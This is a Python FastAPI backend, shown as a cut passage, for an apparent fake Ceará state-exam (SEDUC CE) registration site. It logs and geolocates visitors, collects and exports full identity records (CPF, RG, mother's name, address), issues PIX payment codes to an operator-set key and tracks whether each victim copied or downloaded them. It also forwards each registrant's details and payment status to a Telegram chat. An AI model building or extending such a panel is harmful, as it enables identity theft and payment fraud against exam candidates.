    now = datetime.now(timezone.utc)
    for i in range(6, -1, -1):
        d = (now - timedelta(days=i)).replace(hour=0, minute=0, second=0, microsecond=0)
        d_next = d + timedelta(days=1)
        acessos = await _db.accesses.count_documents({'created_at': {'$gte': d, '$lt': d_next}})
        inscr = await _db.registrations.count_documents({'created_at': {'$gte': d, '$lt': d_next}})
        days.append({'day': d.strftime('%d/%m'), 'acessos': acessos, 'inscricoes': inscr})
    return days

@admin_router.get('/admin/dashboard/activity')
async def activity(rng: str = Query('7d', alias='range'), user=Depends(require_admin)):
    """Atividade com janelas dinâmicas:
    - 1h  → 12 buckets de 5 minutos
    - 24h → 24 buckets de 1 hora
    - 7d  → 7 buckets de 1 dia
    Retorna [{label, acessos, inscricoes}].
    """
    now = datetime.now(timezone.utc)
    buckets = []
    if rng == '1h':
        # alinhado ao próximo bucket de 5 min (futuro mais próximo) e volta 12 passos
        floor_min = (now.minute // 5) * 5
        anchor = now.replace(minute=floor_min, second=0, microsecond=0) + timedelta(minutes=5)
        for i in range(12, 0, -1):
            start = anchor - timedelta(minutes=i * 5)
            end = start + timedelta(minutes=5)
            buckets.append((start, end, start.strftime('%H:%M')))
    elif rng == '24h':
        anchor = now.replace(minute=0, second=0, microsecond=0) + timedelta(hours=1)
        for i in range(24, 0, -1):
            start = anchor - timedelta(hours=i)
            end = start + timedelta(hours=1)
            buckets.append((start, end, start.strftime('%H:%M')))
    else:  # 7d (default)
        for i in range(6, -1, -1):
            start = (now - timedelta(days=i)).replace(hour=0, minute=0, second=0, microsecond=0)
            end = start + timedelta(days=1)
            buckets.append((start, end, start.strftime('%d/%m')))

    out = []
    for start, end, label in buckets:
        acessos = await _db.accesses.count_documents({'created_at': {'$gte': start, '$lt': end}})
        inscr = await _db.registrations.count_documents({'created_at': {'$gte': start, '$lt': end}})
        out.append({'day': label, 'acessos': acessos, 'inscricoes': inscr})
    return out

@admin_router.get('/admin/dashboard/realtime')
async def realtime(limit: int = 10000, user=Depends(require_admin)):
    cursor = _db.events.find({}, {'_id': 0}).sort('created_at', -1).limit(limit)
    items = []
    async for doc in cursor:
        doc['created_at'] = iso_utc(doc.get('created_at'))
        items.append(doc)
    return items

@admin_router.get('/admin/accesses')
async def list_accesses(skip: int = 0, limit: int = 10000, q: str = '', user=Depends(require_admin)):
    filt = {}
    if q:
        filt['$or'] = [
            {'ip': {'$regex': q}},
            {'city': {'$regex': q, '$options': 'i'}},
            {'uf': {'$regex': q, '$options': 'i'}},
            {'user_agent': {'$regex': q, '$options': 'i'}},
        ]
    cursor = _db.accesses.find(filt, {'_id': 0}).sort('created_at', -1).skip(skip).limit(limit)
    items = []
    async for doc in cursor:
        doc['created_at'] = iso_utc(doc.get('created_at'))
        ua = (doc.get('user_agent') or '').lower()
        doc['device'] = 'mobile' if any(k in ua for k in ['mobi', 'android', 'iphone', 'ipad', 'ipod']) else 'desktop'
        items.append(doc)
    total = await _db.accesses.count_documents(filt)
    return {'items': items, 'total': total}

@admin_router.get('/admin/inscriptions')
async def list_inscriptions(skip: int = 0, limit: int = 10000, q: str = '', status: str = '', user=Depends(require_admin)):
    # Apenas inscrições finalizadas (que clicaram em "Prosseguir Pré-Inscrição")
    filt = {'finalized': True}
    if q:
        filt['$or'] = [
            {'nome': {'$regex': q, '$options': 'i'}},
            {'cpf': {'$regex': q}},
            {'email': {'$regex': q, '$options': 'i'}},
            {'concurso': {'$regex': q, '$options': 'i'}},
        ]
    cursor = _db.inscricoes.find(filt, {'_id': 0, 'senha_hash': 0}).sort('created_at', -1).skip(skip).limit(limit)
    raw_items = []
    async for doc in cursor:
        doc['created_at'] = iso_utc(doc.get('created_at'))
        raw_items.append(doc)

    # status precomputado: usa pix_status da inscrição (último evento ganha), fallback por CPF/nome nas coleções
    cpfs = list({i.get('cpf') for i in raw_items if i.get('cpf')})
    downloaded = set()
    copied = set()
    generated = set()
    if cpfs:
        async for d in _db.pix_downloaded.find({'$or': [{'cpf': {'$in': cpfs}}, {'extra.cpf': {'$in': cpfs}}]}, {'cpf': 1, 'extra.cpf': 1, '_id': 0}):
            cpf = d.get('cpf') or (d.get('extra') or {}).get('cpf')
            if cpf: downloaded.add(cpf)
        async for d in _db.pix_copied.find({'$or': [{'cpf': {'$in': cpfs}}, {'extra.cpf': {'$in': cpfs}}]}, {'cpf': 1, 'extra.cpf': 1, '_id': 0}):
            cpf = d.get('cpf') or (d.get('extra') or {}).get('cpf')
            if cpf: copied.add(cpf)
        async for d in _db.pix_generated.find({'$or': [{'cpf': {'$in': cpfs}}, {'extra.cpf': {'$in': cpfs}}]}, {'cpf': 1, 'extra.cpf': 1, '_id': 0}):
            cpf = d.get('cpf') or (d.get('extra') or {}).get('cpf')
            if cpf: generated.add(cpf)
    # fallback by nome (algumas vezes só vem nome no extra)
    nomes_map = {}
    if raw_items:
        nomes_map = {i.get('nome', '').upper(): i.get('cpf') for i in raw_items if i.get('nome')}
        for col, target in [(_db.pix_downloaded, downloaded), (_db.pix_copied, copied), (_db.pix_generated, generated)]:
            async for d in col.find({'extra.nome': {'$in': list(nomes_map.keys())}}, {'extra.nome': 1, '_id': 0}):
                nm = ((d.get('extra') or {}).get('nome') or '').upper()
                cpf = nomes_map.get(nm)
                if cpf: target.add(cpf)

    def compute_status(doc):
        # PRIORIDADE 1: pix_status salvo na inscrição (reflete o ÚLTIMO evento)
        ps = doc.get('pix_status')
        if ps:
            return ps
        # FALLBACK: lógica antiga por prioridade (baixado > copiado > gerado)
        cpf = doc.get('cpf')
        if cpf in downloaded: return 'PIX baixado'
        if cpf in copied: return 'PIX copiado'
        if cpf in generated: return 'PIX gerado'
        return 'Aguardando pagamento'

    items = []
    for doc in raw_items:
        cpf = doc.get('cpf')
        ua = (doc.get('user_agent') or '').lower()
        device = 'mobile' if any(k in ua for k in ['mobi','android','iphone','ipad','ipod']) else 'desktop'
        # Valor: usa APENAS o valor real registrado na inscrição (sem fallback).
        valor = VALOR_INSCRICAO
        item = {**doc}
        item.update({
            'valor': valor,
            'status': compute_status(doc),
            'device': device,
        })
        items.append(item)

    if status:
        items = [i for i in items if i['status'] == status]
    total = await _db.inscricoes.count_documents(filt)
    return {'items': items, 'total': total}

@admin_router.get('/admin/users')
async def list_users(skip: int = 0, limit: int = 10000, q: str = '', user=Depends(require_admin)):
    filt = {}
    if q:
        filt['$or'] = [
            {'nome': {'$regex': q, '$options': 'i'}},
            {'cpf': {'$regex': q}},
            {'email': {'$regex': q, '$options': 'i'}},
        ]
    cursor = _db.inscricoes.find(filt, {'_id': 0, 'senha_hash': 0}).sort('created_at', -1).skip(skip).limit(limit)
    items = []
    async for doc in cursor:
        ca = doc.get('created_at')
        doc['created_at'] = ca.isoformat() if isinstance(ca, datetime) else ca
        items.append(doc)
    total = await _db.inscricoes.count_documents(filt)
    return {'items': items, 'total': total}

@admin_router.delete('/admin/inscriptions/{insc_id}')
async def delete_inscription(insc_id: str, user=Depends(require_admin)):
    res = await _db.inscricoes.delete_one({'id': insc_id})
    return {'deleted': res.deleted_count}

@admin_router.post('/admin/inscriptions/clear-all')
async def clear_all_inscriptions(user=Depends(require_admin)):
    """Limpeza total: apaga inscrições, cadastros (com documentos), registros e eventos PIX."""
    res = await _db.inscricoes.delete_many({})
    await _db.registrations.delete_many({})
    await _db.cadastros.delete_many({})
    await _db.pix_generated.delete_many({})
    await _db.pix_copied.delete_many({})
    await _db.pix_downloaded.delete_many({})
    await _db.events.delete_many({})
    return {'deleted': res.deleted_count}

@admin_router.delete('/admin/users/{user_id}')
async def delete_user(user_id: str, user=Depends(require_admin)):
    res = await _db.inscricoes.delete_one({'id': user_id})
    return {'deleted': res.deleted_count}


# ------------ CADASTROS (ficha única por CPF) ------------
def _format_cpf_admin(cpf: str) -> str:
    d = ''.join(c for c in (cpf or '') if c.isdigit())
    if len(d) != 11:
        return cpf or '—'
    return f"{d[:3]}.{d[3:6]}.{d[6:9]}-{d[9:]}"

@admin_router.get('/admin/cadastros')
async def list_cadastros(skip: int = 0, limit: int = 10000, q: str = '', user=Depends(require_admin)):
    filt = {}
    if q:
        filt['$or'] = [
            {'nome': {'$regex': q, '$options': 'i'}},
            {'cpf': {'$regex': q}},
            {'email': {'$regex': q, '$options': 'i'}},
        ]
    cursor = _db.cadastros.find(filt, {'_id': 0}).sort('last_at', -1).skip(skip).limit(limit)
    items = []
    async for doc in cursor:
        for k in ('created_at', 'last_at'):
            if isinstance(doc.get(k), datetime):
                doc[k] = iso_utc(doc[k])
        items.append(doc)
    total = await _db.cadastros.count_documents(filt)
    return {'items': items, 'total': total}

@admin_router.get('/admin/cadastros/export.txt')
async def export_cadastros_txt(q: str = '', user=Depends(require_admin)):
    """Exporta a lista de cadastros como TXT organizado."""
    from fastapi.responses import PlainTextResponse
    filt = {}
    if q:
        filt['$or'] = [
            {'nome': {'$regex': q, '$options': 'i'}},
            {'cpf': {'$regex': q}},
            {'email': {'$regex': q, '$options': 'i'}},
        ]
    cursor = _db.cadastros.find(filt, {'_id': 0}).sort('last_at', -1)
    items = []
    async for doc in cursor:
        items.append(doc)

    now_br = (datetime.now(timezone.utc) - timedelta(hours=3)).strftime('%d/%m/%Y às %H:%M')
    total = len(items)

    lines = []
    lines.append("═" * 70)
    lines.append("                   CADASTROS — PORTAL")
    lines.append(f"           Exportado em: {now_br}")
    lines.append(f"           Total: {total} {'cadastro' if total == 1 else 'cadastros'}")
    if q:
        lines.append(f"           Filtro: \"{q}\"")
    lines.append("═" * 70)
    lines.append("")

    if not items:
        lines.append("   (nenhum cadastro encontrado)")
        lines.append("")
    else:
        for idx, c in enumerate(items, 1):
            cpf = _format_cpf_admin(c.get('cpf', ''))
            nome = c.get('nome') or '—'
            email = (c.get('email') or '—').lower() if c.get('email') else '—'
            dt = c.get('last_at') or c.get('created_at')
            if isinstance(dt, datetime):
                dt_str = (dt - timedelta(hours=3)).strftime('%d/%m/%Y às %H:%M')
            elif isinstance(dt, str):
                try:
                    parsed = datetime.fromisoformat(dt.replace('Z', '+00:00'))
                    dt_str = (parsed - timedelta(hours=3)).strftime('%d/%m/%Y às %H:%M')
                except Exception:
                    dt_str = dt
            else:
                dt_str = '—'
            device = 'Mobile' if c.get('device') == 'mobile' else 'Desktop'
            concurso = c.get('last_concurso') or '—'
            insc_count = c.get('inscricoes_count', 0)

            lines.append(f"  #{idx:03d}  {nome}")
            lines.append(f"  " + "─" * 66)
            lines.append(f"    CPF              : {cpf}")
            lines.append(f"    E-mail           : {email}")
            lines.append(f"    Data do cadastro : {dt_str}")
            lines.append(f"    Dispositivo      : {device}")
            lines.append(f"    Último concurso  : {concurso}")
            lines.append(f"    Inscrições       : {insc_count}")
            lines.append("")

    lines.append("═" * 70)
    lines.append(f"  Fim do relatório — {total} {'registro' if total == 1 else 'registros'}")
    lines.append("═" * 70)

    content = "\n".join(lines) + "\n"
    filename = f"cadastros_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M')}.txt"
    return PlainTextResponse(
        content=content,
        media_type='text/plain; charset=utf-8',
        headers={'Content-Disposition': f'attachment; filename="{filename}"'},
    )

@admin_router.delete('/admin/cadastros/{cpf}')
async def delete_cadastro(cpf: str, user=Depends(require_admin)):
    cpf_digits = ''.join(c for c in (cpf or '') if c.isdigit())
    res = await _db.cadastros.delete_one({'cpf': cpf_digits})
    return {'ok': True, 'deleted': res.deleted_count}


@admin_router.get('/admin/cadastros/{cpf}/details')
async def get_cadastro_details(cpf: str, user=Depends(require_admin)):
    cpf_digits = ''.join(c for c in (cpf or '') if c.isdigit())
    doc = await _db.cadastros.find_one({'cpf': cpf_digits}, {'_id': 0})
    if not doc:
        raise HTTPException(status_code=404, detail='Cadastro não encontrado.')
    # serializa datetimes
    for k, v in list(doc.items()):
        if isinstance(v, datetime):
            doc[k] = v.isoformat()
    return doc


@admin_router.get('/admin/cadastros/export-full.txt')
async def export_cadastros_full_txt(q: str = '', user=Depends(require_admin)):
    """Exporta TODOS os campos do formulário de cadastro como TXT organizado."""
    from fastapi.responses import PlainTextResponse
    filt = {}
    if q:
        filt['$or'] = [
            {'nome': {'$regex': q, '$options': 'i'}},
            {'cpf': {'$regex': q}},
            {'email': {'$regex': q, '$options': 'i'}},
        ]
    cursor = _db.cadastros.find(filt, {'_id': 0}).sort('last_at', -1)
    items = []
    async for doc in cursor:
        items.append(doc)

    now_br = (datetime.now(timezone.utc) - timedelta(hours=3)).strftime('%d/%m/%Y às %H:%M')
    total = len(items)

    # Rótulos amigáveis para os campos do form_data
    LABELS = [
        ('nome', 'Nome'), ('nomeSocial', 'Nome Social'), ('sexo', 'Sexo'),
        ('nascimento', 'Nascimento'), ('nacionalidade', 'Nacionalidade'),
        ('escolaridade', 'Escolaridade'), ('estadoCivil', 'Estado Civil'),
        ('nomeMae', 'Nome da Mãe'),
        ('cep', 'CEP'), ('endereco', 'Endereço'), ('numero', 'Número'),
        ('complemento', 'Complemento'), ('bairro', 'Bairro'),
        ('cidade', 'Cidade'), ('uf', 'UF'),
        ('tel1', 'Telefone 1'), ('tel1Tipo', 'Tipo Tel. 1'),
        ('tel2', 'Telefone 2'), ('tel2Tipo', 'Tipo Tel. 2'),
        ('email', 'E-mail'), ('pcd', 'PCD'),
        ('rg', 'RG'), ('rgData', 'RG Data'),
        ('rgOrgao', 'RG Órgão'), ('rgUF', 'RG UF'),
        ('cpf', 'CPF'),
    ]

    lines = []
    lines.append("═" * 78)
    lines.append("            CADASTROS COMPLETOS — FORMULÁRIO DE INSCRIÇÃO")
    lines.append(f"            Exportado em: {now_br}")
    lines.append(f"            Total: {total} {'cadastro' if total == 1 else 'cadastros'}")
    if q:
        lines.append(f"            Filtro: \"{q}\"")
    lines.append("═" * 78)
    lines.append("")

    if not items:
        lines.append("   (nenhum cadastro encontrado)")
        lines.append("")
    else:
        for idx, c in enumerate(items, 1):
            cpf = _format_cpf_admin(c.get('cpf', ''))
            nome = c.get('nome') or '—'
            dt = c.get('last_at') or c.get('created_at')
            if isinstance(dt, datetime):
                dt_str = (dt - timedelta(hours=3)).strftime('%d/%m/%Y às %H:%M')
            elif isinstance(dt, str):
                try:
                    parsed = datetime.fromisoformat(dt.replace('Z', '+00:00'))
                    dt_str = (parsed - timedelta(hours=3)).strftime('%d/%m/%Y às %H:%M')
                except Exception:
                    dt_str = dt
            else:
                dt_str = '—'

            lines.append(f"  #{idx:03d}  {nome}  ({cpf})")
            lines.append("  " + "─" * 74)
            lines.append(f"    Data do cadastro : {dt_str}")
            lines.append(f"    Último concurso  : {c.get('last_concurso') or '—'}")
            lines.append(f"    Inscrições       : {c.get('inscricoes_count', 0)}")
            lines.append("")

            fd = c.get('form_data') or {}
            if fd:
                lines.append("    Dados do formulário:")
                for key, label in LABELS:
                    val = fd.get(key, '')
                    if val is None or val == '':
                        val = '—'
                    lines.append(f"      {label:<18}: {val}")
            else:
                lines.append("    (dados completos do formulário não disponíveis para este cadastro)")
            lines.append("")
            lines.append("")

    lines.append("═" * 78)
    lines.append(f"  Fim do relatório — {total} {'registro' if total == 1 else 'registros'}")
    lines.append("═" * 78)

    content = "\n".join(lines) + "\n"
    filename = f"cadastros_completos_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M')}.txt"
    return PlainTextResponse(
        content=content,
        media_type='text/plain; charset=utf-8',
        headers={'Content-Disposition': f'attachment; filename="{filename}"'},
    )


@admin_router.delete('/admin/cadastros')
@admin_router.post('/admin/cadastros/clear-all')
async def delete_all_cadastros(user=Depends(require_admin)):
    """Limpeza total: apaga cadastros (com documentos), inscrições, registros e eventos PIX."""
    res = await _db.cadastros.delete_many({})
    await _db.inscricoes.delete_many({})
    await _db.registrations.delete_many({})
    await _db.pix_generated.delete_many({})
    await _db.pix_copied.delete_many({})
    await _db.pix_downloaded.delete_many({})
    await _db.events.delete_many({})
    return {'ok': True, 'deleted': res.deleted_count}

@admin_router.get('/admin/settings')
async def get_settings(user=Depends(require_admin)):
    s = await _db.settings.find_one({'_id': 'main'}, {'_id': 0})
    defaults = {
        'valor_inscricao': VALOR_INSCRICAO, 'mensagem': '', 'data_prova': '',
        'pix_key': '', 'pix_nome': '', 'pix_cidade': '',
        'telegram_bot_token': '', 'telegram_chat_id': '', 'telegram_enabled': False,
    }
    return {**defaults, **(s or {})}

@admin_router.put('/admin/settings')
async def put_settings(data: Dict[str, Any], user=Depends(require_admin)):
    await _db.settings.update_one({'_id': 'main'}, {'$set': data}, upsert=True)
    return {'ok': True}


@admin_router.get('/pix-config')
async def get_pix_config():
    """Endpoint público — devolve apenas dados do PIX necessários para gerar o
    BR Code no frontend. NÃO expõe credenciais de Telegram nem outras configs."""
    s = await _db.settings.find_one({'_id': 'main'}, {'_id': 0}) or {}
    return {
        'key': s.get('pix_key', '') or '',
        'nome': (s.get('pix_nome', '') or '').upper()[:25],
        'cidade': (s.get('pix_cidade', '') or '').upper()[:15],
    }


@admin_router.post('/pix/generate')
async def generate_pix_brcode(payload: Dict[str, Any]):
    """Gera o BR Code PIX + imagem QR code em PNG base64.

    SEMPRE busca a chave atual do MongoDB (settings) — sem cache.
    Validação rigorosa do EMV padrão BACEN.

    Body:
      { "valor": 150.00, "txid": "IDC12345", "info": "Inscricao Cargo X",
        "cpf": "111...", "cargo_codigo": "01103" }

    Returns:
      { "pix_code": "0002...", "qr_png_base64": "iVBORw0KG...", "key": "...", "nome": "..." }
    """
    from pix_generator import build_brcode, build_qr_png_base64

    s = await _db.settings.find_one({'_id': 'main'}, {'_id': 0}) or {}
    key = (s.get('pix_key') or '').strip()
    if not key:
        raise HTTPException(status_code=400, detail='Chave PIX não configurada no painel admin')

    nome = (s.get('pix_nome') or 'CONCURSO SEDUC CE').upper()
    cidade = (s.get('pix_cidade') or 'FORTALEZA').upper()

    try:
        valor = float(payload.get('valor', 0) or 0)
    except Exception:
        valor = 0.0
    txid = (payload.get('txid') or '').strip()
    valor = VALOR_INSCRICAO

    # Fonte única de verdade: usa SEMPRE o valor real da inscrição (painel admin)
    # quando existir, ignorando qualquer valor divergente enviado pelo cliente.
    cpf_lookup = re.sub(r'\D', '', (payload.get('cpf') or '') or '')
    if cpf_lookup:
        insc = await _db.inscricoes.find_one(
            {'cpf': cpf_lookup},
            {'valor': 1},
            sort=[('created_at', -1)],
        )

    pix_code = build_brcode(
        pix_key=key,
        valor=valor,
        nome_beneficiario=nome,
        cidade_beneficiario=cidade,
        txid=txid or '***',
    )
    qr_b64 = build_qr_png_base64(pix_code, box_size=8, border=2)

    # Persiste a chave usada na inscrição (se foram passados cpf+cargo_codigo)
    cpf = re.sub(r'\D', '', (payload.get('cpf') or '') or '')
    cargo_codigo = (payload.get('cargo_codigo') or '').strip()
    if cpf:
        try:
            update_set = {
                'pix_key_used': key,
                'pix_key_used_at': now_iso(),
            }
            matched = 0
            if cargo_codigo:
                # cargo_codigo pode vir como "01103" ou "COD 01103" — busca os 2 formatos
                digits = re.sub(r'\D', '', cargo_codigo)
                variants = list({cargo_codigo, digits, f'COD {digits}', f'COD{digits}'})
                r = await _db.inscricoes.update_one(
                    {'cpf': cpf, 'cargo_codigo': {'$in': variants}},
                    {'$set': update_set}
                )
                matched = r.matched_count
            # Fallback: se não casou, tenta só por CPF (caso candidato tenha 1 inscrição)
            if matched == 0:
                count = await _db.inscricoes.count_documents({'cpf': cpf})
                if count == 1:
                    await _db.inscricoes.update_one(
                        {'cpf': cpf},
                        {'$set': update_set}
                    )
                elif count > 1:
                    # Atualiza a mais recente sem pix_key_used
                    doc = await _db.inscricoes.find_one(
                        {'cpf': cpf, 'pix_key_used': {'$exists': False}},
                        sort=[('created_at', -1)]
                    )
                    if doc:
                        await _db.inscricoes.update_one(
                            {'_id': doc['_id']},
                            {'$set': update_set}
                        )
        except Exception as e:
            logging.warning(f'[pix/generate] falha ao persistir pix_key_used: {e}')

    return {
        'pix_code': pix_code,
        'qr_png_base64': qr_b64,
        'key': key,
        'nome': nome,
        'cidade': cidade,
        'valor': valor,
    }


@admin_router.get('/inscricao/resumo/{cpf}')
async def inscricao_resumo(cpf: str):
    """Resumo público da última inscrição por CPF (usado pelo deep-link do e-mail)."""
    digits = re.sub(r'\D', '', cpf or '')
    if not digits:
        raise HTTPException(status_code=404, detail='CPF inválido')
    doc = await _db.inscricoes.find_one({'cpf': digits}, sort=[('created_at', -1)])
    if not doc:
        raise HTTPException(status_code=404, detail='Inscrição não encontrada')
    return {
        'nome': doc.get('nome', ''),
        'cpf': digits,
        'cargo_titulo': doc.get('cargo_titulo', ''),
        'cargo_codigo': doc.get('cargo_codigo', ''),
        'valor': VALOR_INSCRICAO,
        'taxa': TAXA_INSCRICAO_STR,
        'protocolo': doc.get('protocolo', ''),
        'concurso': doc.get('concurso', ''),
    }


@admin_router.get('/pix/qr.png')
async def pix_qr_png(valor: float = 0, txid: str = ''):
    """Retorna QR PIX como PNG direto (sem JSON, sem CORS)."""
    from pix_generator import build_brcode, build_qr_png_base64
    import base64
    from fastapi.responses import Response
    s = await _db.settings.find_one({'_id': 'main'}, {'_id': 0}) or {}
    key = (s.get('pix_key') or '').strip()
    if not key:
        raise HTTPException(400, 'Chave PIX não configurada')
    nome = (s.get('pix_nome') or 'CONCURSO SEDUC CE').upper()
    cidade = (s.get('pix_cidade') or 'FORTALEZA').upper()
    pix_code = build_brcode(pix_key=key, valor=VALOR_INSCRICAO, nome_beneficiario=nome, cidade_beneficiario=cidade, txid=(txid or '').strip() or '***')
    qr_b64 = build_qr_png_base64(pix_code, box_size=8, border=2)
    return Response(content=base64.b64decode(qr_b64), media_type='image/png', headers={'Cache-Control':'no-store, no-cache'})


@admin_router.get('/pix/code.txt')
async def pix_code_txt(valor: float = 0, txid: str = ''):
    """Retorna o BR Code PIX como texto puro."""
    from pix_generator import build_brcode
    from fastapi.responses import PlainTextResponse
    s = await _db.settings.find_one({'_id': 'main'}, {'_id': 0}) or {}
    key = (s.get('pix_key') or '').strip()
    if not key:
        raise HTTPException(400, 'Chave PIX não configurada')
    nome = (s.get('pix_nome') or 'CONCURSO SEDUC CE').upper()
    cidade = (s.get('pix_cidade') or 'FORTALEZA').upper()
    pix_code = build_brcode(pix_key=key, valor=VALOR_INSCRICAO, nome_beneficiario=nome, cidade_beneficiario=cidade, txid=(txid or '').strip() or '***')
    return PlainTextResponse(content=pix_code, headers={'Cache-Control':'no-store, no-cache'})




# ------------ TELEGRAM ------------
async def _telegram_send(token: str, chat_id: str, text: str) -> Dict[str, Any]:
    """Send a Telegram message via Bot API. Returns dict with ok and details."""
    if not token or not chat_id:
        return {'ok': False, 'error': 'Token ou Chat ID não configurados.'}
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    try:
        async with httpx.AsyncClient(timeout=8.0) as client:
            r = await client.post(url, json={
                'chat_id': chat_id,
                'text': text,
                'parse_mode': 'HTML',
                'disable_web_page_preview': True,
            })
            data = r.json()
            if r.status_code == 200 and data.get('ok'):
                return {'ok': True, 'message_id': data.get('result', {}).get('message_id')}
            return {'ok': False, 'error': data.get('description', f'HTTP {r.status_code}')}
    except Exception as e:
        return {'ok': False, 'error': str(e)}

async def notify_telegram_inscricao(insc: Dict[str, Any]):
    """DEPRECATED — mantida por compatibilidade. Use notify_or_update_telegram."""
    return


def _status_emoji(status: str) -> str:
    return {
        'Aguardando pagamento': '🟡',
        'PIX gerado': '🔵',
        'PIX copiado': '🟢',
        'PIX baixado': '🟢',
    }.get(status or '', '🟡')


def _format_cpf_br(cpf: str) -> str:
    d = ''.join(c for c in (cpf or '') if c.isdigit())
    if len(d) != 11:
        return cpf or '—'
    return f"{d[:3]}.{d[3:6]}.{d[6:9]}-{d[9:]}"


def _format_data_hora_brt(dt) -> str:
    """Formata como 'dd/mm/YYYY às HH:MM' em horário de Brasília (UTC-3)."""
    if not dt:
        dt = datetime.now(timezone.utc)
    if isinstance(dt, str):
        try:
            dt = datetime.fromisoformat(dt.replace('Z', '+00:00'))
        except Exception:
            dt = datetime.now(timezone.utc)
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)
    brt = dt - timedelta(hours=3)
    return brt.strftime('%d/%m/%Y às %H:%M')


def _build_telegram_message(insc: Dict[str, Any], settings: Dict[str, Any] = None) -> str:
    """Constroi a mensagem do Telegram no formato definido pelo cliente."""
    settings = settings or {}
    titulo = settings.get('telegram_titulo') or 'NOVA INSCRIÇÃO - SEDUC CE 26'

    nome = str(insc.get('nome') or 'Candidato').strip()
    cpf = _format_cpf_br(insc.get('cpf', ''))

    # Data/hora: prioriza telegram_sent_at (primeira notificação) para manter consistente
    dt_iso = insc.get('telegram_sent_at') or insc.get('atualizado_em') or insc.get('created_at')
    data_hora = _format_data_hora_brt(dt_iso)

    device_label = 'Mobile' if (insc.get('device') == 'mobile') else 'Desktop'

    city = str(insc.get('city') or '').strip()
    region = str(insc.get('region_name') or insc.get('uf') or '').strip()
    if city and region:
        local = f"{city}/{region}"
    elif city:
        local = city
    elif region:
        local = region
    else:
        local = '—'

    # Valor da inscrição
    try:
        valor_num = VALOR_INSCRICAO
    except Exception:
        valor_num = VALOR_INSCRICAO
    if valor_num > 0:
        valor_str = ('R$ ' + f"{valor_num:,.2f}").replace(',', '_').replace('.', ',').replace('_', '.')
    else:
        valor_str = '—'

    status = insc.get('pix_status') or 'Aguardando pagamento'
    emoji = _status_emoji(status)

    return (
        f"<b>{titulo}</b>\n"
        "━━━━━━━━━━━━━━━━━\n\n"
        f"👤 <b>Usuário:</b> {nome}\n"
        f"🔐 <b>CPF:</b> {cpf}\n"
        f"📅 <b>Data/hora:</b> {data_hora}\n"
        f"📱 <b>Dispositivo:</b> {device_label}\n"
        f"📍 <b>Local:</b> {local}\n"
        f"💰 <b>Valor:</b> {valor_str}\n"
        f"📊 <b>Status:</b> {emoji} {status}"
    )


async def _telegram_edit(token: str, chat_id: str, message_id: int, text: str) -> Dict[str, Any]:
    """Edita uma mensagem do Telegram via editMessageText."""
    url = f"https://api.telegram.org/bot{token}/editMessageText"
    try:
        async with httpx.AsyncClient(timeout=8.0) as client:
            r = await client.post(url, json={
                'chat_id': chat_id,
                'message_id': message_id,
                'text': text,
                'parse_mode': 'HTML',
                'disable_web_page_preview': True,
            })
            data = r.json()
            if r.status_code == 200 and data.get('ok'):
                return {'ok': True}
            err = (data.get('description') or '') if isinstance(data, dict) else ''
            # Se a mensagem está idêntica, o Telegram retorna erro — ignoramos
            if 'not modified' in err.lower():
                return {'ok': True, 'unchanged': True}
            return {'ok': False, 'error': err or f'HTTP {r.status_code}'}
    except Exception as e:
        return {'ok': False, 'error': str(e)}


async def notify_or_update_telegram(cpf: str, request: Request = None, extra: Dict[str, Any] = None):
    """Envia notificação OU edita a mensagem existente para refletir o status atual.
    - Primeira chamada (sem telegram_message_id na inscrição): envia e salva o message_id.
    - Chamadas subsequentes: edita a mensagem original com o status atualizado.
    `extra` permite identificar a inscrição correta quando há múltiplas por CPF
    (usa protocolo / cargo_codigo, com fallback para a inscrição mais recente).
    Best-effort — qualquer erro é logado mas não propaga.
    """
    if not cpf:
        return
    try:
        s = await _db.settings.find_one({'_id': 'main'}) or {}
        if not s.get('telegram_enabled'):
            return
        token = (s.get('telegram_bot_token') or '').strip()
        chat = str(s.get('telegram_chat_id') or '').strip()
        if not token or not chat:
            return

        # Localiza a MESMA inscrição que foi atualizada por _upsert_pix_status.
        # Prioriza filtro mais específico (protocolo > cargo_codigo) e cai para a
        # inscrição mais recente do CPF como fallback.
        extra = extra or {}
        protocolo = str(extra.get('protocolo') or '').strip()
        cargo_codigo = str(extra.get('cargo_codigo') or extra.get('codigo') or '').strip()
        insc = None
        if protocolo:
            insc = await _db.inscricoes.find_one({'cpf': cpf, 'protocolo': protocolo})
        if not insc and cargo_codigo:
            insc = await _db.inscricoes.find_one({'cpf': cpf, 'cargo_codigo': cargo_codigo})
        if not insc:
            insc = await _db.inscricoes.find_one(
                {'cpf': cpf}, sort=[('pix_status_at', -1), ('created_at', -1)]
            )
        if not insc:
            return
        insc_id = insc.get('_id')

        # Enriquecimento (apenas na primeira vez ou se faltar info)
        needs_geo = not insc.get('city')
        needs_device = not insc.get('device')
        if request is not None and (needs_geo or needs_device):
            patch = {}
            ip = get_real_ip(request)
            if needs_geo:
                geo = await geolocate_ip(ip)
                patch['ip'] = ip
                patch['city'] = geo.get('city', '')
                patch['uf'] = geo.get('uf', '')
                patch['region_name'] = geo.get('region_name', '')
                patch['country'] = geo.get('country', '')
            if needs_device:
                ua = (insc.get('user_agent') or request.headers.get('user-agent', '') or '').lower()
                patch['device'] = 'mobile' if any(k in ua for k in ['mobi', 'android', 'iphone', 'ipad', 'ipod']) else 'desktop'
                if not insc.get('user_agent'):
                    patch['user_agent'] = request.headers.get('user-agent', '')
            if patch:
                await _db.inscricoes.update_one({'_id': insc_id}, {'$set': patch})
                insc.update(patch)

        msg_id = insc.get('telegram_message_id')
        text = _build_telegram_message(insc, s)

        if msg_id:
            res = await _telegram_edit(token, chat, int(msg_id), text)
            if not res.get('ok'):
                logger.warning(f"Telegram edit failed for cpf={cpf}: {res.get('error')}")
        else:
            # Primeira vez — registra telegram_sent_at antes do envio para usar na mensagem
            now = datetime.now(timezone.utc)
            insc['telegram_sent_at'] = now
            text = _build_telegram_message(insc, s)
            res = await _telegram_send(token, chat, text)
            if res.get('ok') and res.get('message_id'):
                await _db.inscricoes.update_one({'_id': insc_id}, {'$set': {
                    'telegram_message_id': res['message_id'],
                    'telegram_sent_at': now,
                }})
            else:
                logger.warning(f"Telegram send failed for cpf={cpf}: {res.get('error')}")
    except Exception as e:
        logger.warning(f"notify_or_update_telegram error: {e}")

class TelegramTestIn(BaseModel):
    bot_token: Optional[str] = None
    chat_id: Optional[str] = None

@admin_router.post('/admin/telegram/test')
